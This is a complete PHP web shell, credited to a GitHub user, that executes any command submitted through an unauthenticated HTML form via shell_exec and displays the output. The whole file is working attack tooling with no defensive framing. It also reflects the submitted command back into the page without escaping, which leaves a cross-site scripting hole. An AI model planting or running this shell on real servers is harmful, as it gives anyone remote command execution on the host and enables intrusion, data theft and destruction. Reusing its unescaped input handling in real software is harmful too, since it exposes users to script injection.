<?php

if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}

?>
<!DOCTYPE html>
<html>
    
<!-- By ArtyumX (https://github.com/ArtyumX) -->

<head>

    <meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <link rel="stylesheet" type="text/css" href="//bootswatch.com/flatly/bootstrap.css">

    <title> CMD </title>
    
    <style>
        .container {
            width: 850px;
        }
    </style>

</head>

<body>

<div class="container">

    <div class="page-header">
        <h2> Execute a command </h2>
    </div>

    <form action="" method="POST">
        <div class="form-group">
            <label for="cmd">Command</label>
            <input type="text" class="form-control" name="cmd" id="cmd" value="<?= $_POST['cmd'] ?>" required>
        </div>
        <button type="submit" class="btn btn-default">Execute</button>
    </form>

<?php if ($cmd): ?>
    <div class="page-header">
        <h2> Output </h2>
    </div>
    <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
    </pre>
<?php endif; ?>

</div>

</body>

</html>
